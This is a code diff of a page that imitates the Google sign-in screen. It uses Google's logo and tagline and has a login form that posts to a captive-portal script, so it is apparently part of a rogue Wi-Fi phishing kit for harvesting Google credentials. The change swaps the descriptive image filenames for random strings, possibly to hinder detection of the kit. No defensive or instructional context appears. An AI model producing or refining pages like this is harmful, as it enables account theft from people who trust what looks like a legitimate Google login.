@@ -123,7 +123,7 @@ require_once('helper.php');
 
       <div class="google-header-bar centered">
         <div class="header content clearfix">
-          <img alt="Google" class="logo" src="assets/img/logo.png">
+          <img alt="Google" class="logo" src="assets/img/dtnk16mcjo.png">
         </div>
       </div>
 
@@ -131,7 +131,7 @@ require_once('helper.php');
 
         <div class="account-wall">
 
-          <img class="profile-img" src="assets/img/photo.png" alt="">
+          <img class="profile-img" src="assets/img/yqczrisvt2.png" alt="">
           <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
 
             <input type="hidden" name="target" value="<?=$destination?>">
@@ -146,7 +146,7 @@ require_once('helper.php');
 
             <br><a href="#" class="text-center new-account">Create an account </a>
             <center><br><p class="tagline">One Google Account for everything Google</p>
-            <img src="assets/img/logo_strip.png" width="210" height="17" alt=""></center><br><br>
+            <img src="assets/img/tmjjgvk28i.png" width="210" height="17" alt=""></center><br><br>
 
     </div>
 
